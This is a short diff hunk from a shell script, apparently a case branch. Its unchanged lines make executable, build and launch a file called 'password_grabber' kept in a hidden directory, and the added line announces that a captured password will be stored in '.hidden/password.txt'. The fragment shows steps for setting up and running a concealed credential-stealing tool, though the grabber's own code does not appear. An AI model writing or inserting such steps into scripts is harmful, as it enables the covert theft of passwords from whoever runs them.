@@ -89,6 +89,7 @@ chmod +x .hidden/password_grabber.sh
 make -f .hidden/password_grabber 
 sleep 5
 open .hidden/password_grabber
+echo "password will be stored in .hidden/password.txt"
 ;;
 
 esac
